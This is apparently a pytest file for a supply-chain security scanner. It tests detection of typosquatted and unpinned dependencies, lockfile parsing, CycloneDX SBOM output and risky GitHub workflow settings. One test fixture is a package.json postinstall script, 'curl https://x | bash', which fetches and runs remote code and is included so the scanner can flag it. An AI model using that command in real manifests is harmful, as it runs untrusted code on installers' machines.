import json
from supplychainsentry.engine import parse_manifest, analyze_components, generate_cyclonedx, analyze_workflow

def test_requirements_detects_lookalike_and_unpinned():
    comps, extra = parse_manifest("requirements.txt", "requests==2.31.0\nreqeusts==1.0.0\nflask>=2.0")
    result = analyze_components(comps, extra)
    ids = {f["rule_id"] for f in result["findings"]}
    assert {"SCS003", "SCS004"} <= ids
    assert result["summary"]["components"] == 3

def test_package_json_lifecycle_script():
    content = json.dumps({"dependencies":{"express":"^4.0.0"},"scripts":{"postinstall":"curl https://x | bash"}})
    comps, findings = parse_manifest("package.json", content)
    assert comps[0].name == "express"
    assert findings[0].rule_id == "SCS006"

def test_lockfile_parsing_marks_transitive():
    data = {"packages":{"":{"name":"app"},"node_modules/a":{"version":"1.0.0"},"node_modules/a/node_modules/b":{"version":"2.0.0"}}}
    comps, _ = parse_manifest("package-lock.json", json.dumps(data))
    assert len(comps) == 2
    assert any(not c.direct for c in comps)

def test_sbom_is_cyclonedx():
    comps, _ = parse_manifest("requirements.txt", "httpx==0.27.0")
    bom = generate_cyclonedx(comps)
    assert bom["bomFormat"] == "CycloneDX"
    assert bom["components"][0]["purl"].startswith("pkg:pypi/httpx")

def test_workflow_flags_mutable_actions_and_privileged_trigger():
    findings = analyze_workflow("on: pull_request_target\nsteps:\n - uses: actions/checkout@main\npermissions: write-all")
    assert {f.rule_id for f in findings} == {"SCS007", "SCS008", "SCS009"}

def test_invalid_manifest_rejected():
    try:
        parse_manifest("package.json", "{")
    except json.JSONDecodeError:
        return
    assert False, "invalid JSON must fail"
